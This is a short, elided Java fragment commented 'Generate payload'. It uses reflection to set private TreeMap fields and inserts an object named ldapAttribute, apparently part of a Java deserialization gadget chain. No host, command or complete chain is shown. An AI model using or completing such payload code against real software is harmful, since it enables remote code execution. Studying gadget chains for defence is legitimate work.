...
// Generate payload
        ...
        Field sizefield = TreeMap.class.getDeclaredField("size");
        Field modCountfield = TreeMap.class.getDeclaredField("modCount");
        ...
        sizefield.set(treeMap1,1);
        modCountfield.set(treeMap1,1);
        rootfield.set(treeMap2,(Map.Entry)entrycor.newInstance(ldapAttribute,"aaa",null));
        sizefield.set(treeMap2,1);
        modCountfield.set(treeMap2,1);
